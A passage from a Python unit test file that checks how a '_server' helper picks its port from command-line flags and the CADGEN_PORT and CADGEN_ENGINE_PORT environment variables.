            data = self.hosts._server({**base, "args": [*base["args"], *flags],
                                       "env": {"CADGEN_PORT": "40001"}})
            self.assertEqual(data["port"], 40002)
        current = self.hosts._server({**base, "env": {"CADGEN_PORT": "40003", "CADGEN_ENGINE_PORT": "40001"}})
        self.assertEqual(current["port"], 40003)


if __name__ == "__main__":
    unittest.main()
